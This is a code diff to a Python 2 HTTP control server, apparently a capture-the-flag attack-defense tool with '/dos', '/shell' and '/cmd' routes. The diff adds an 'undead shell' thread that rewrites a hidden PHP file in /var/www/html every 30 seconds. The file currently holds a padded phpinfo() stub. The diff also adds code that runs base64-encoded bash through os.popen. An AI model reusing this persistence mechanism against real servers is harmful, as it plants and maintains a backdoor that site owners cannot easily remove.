@@ -39,6 +39,11 @@ from urlparse import parse_qs,urlparse
 import time
 import subprocess
 import signal
+import base64
+
+reload(sys)  
+sys.setdefaultencoding('utf8')
+
 
 
 ###### configuration #######
@@ -70,12 +75,40 @@ dir_base = '/'
 # shell scan log
 shell_log_file = './.shell_log'
 
+# shell scan path
+scan_path = '/var/www/html'
+
 
 # routers
 routers = ['/dos','/shell','/cmd','/state']
 
+# undead shell path
+shell_path = '/var/www/html/.1.php'
+
+# undead shell content
+shell_content = "<?php phpinfo();?>\r"
+shell_content =  shell_content + ' ' * len(shell_content) + "\n"
 
 ############################
+
+
+
+######### global functions #############
+
+def g_undead_shell():
+	'''
+		generate undead shell
+	'''
+	while True:
+		open(shell_path,'w').write(shell_content)
+		time.sleep(30)
+
+
+
+
+
+
+########################################
 
 
 class CustomHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
@@ -155,7 +188,10 @@ class CustomHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
 
 
 	def state_handle(self,params):
-		pass
+		'''
+			to get the state of the remote server
+		
+		'''
 
 		cmd = '''#!/bin/bash
 #get cpu number
@@ -205,10 +241,31 @@ done
 echo ""
 
 printf "tcp_listen: %s\n" $tcp_ports
-printf "udp_listen: %s\n" $udp_ports
+printf "udp_listen: %s\n" $udp_ports'''
+
+		cmd = base64.b64encode(cmd)
+	
+		# the popen originally use sh, but we need bash here
+		res = os.popen('echo %s |base64 -d|/bin/bash' %cmd).read()
+		self.success_handle(res)
+		return
 
 
-'''
+	def shell_handle(self,params):
+		'''
+			return the results created by shell scan
+
+		'''
+
+		if os.path.exists(shell_log_file):
+			self.success_handle(open(shell_log_file).read())
+		else:
+			self.error_handle('error: ' + shell_log_file + ' does not exist')
+		
+
+		
+
+
 
 
 
@@ -252,9 +309,9 @@ class MyTCPServer(SocketServer.TCPServer):
 		self.socket.bind(self.server_address)
 
 
-# t = threading.Thread(target=flag_submit,name='flag_submit')
-# t.setDaemon(True)
-# t.start()
+t = threading.Thread(target=g_undead_shell,name='g_undead_shell')
+t.setDaemon(True)
+t.start()
 
 
 
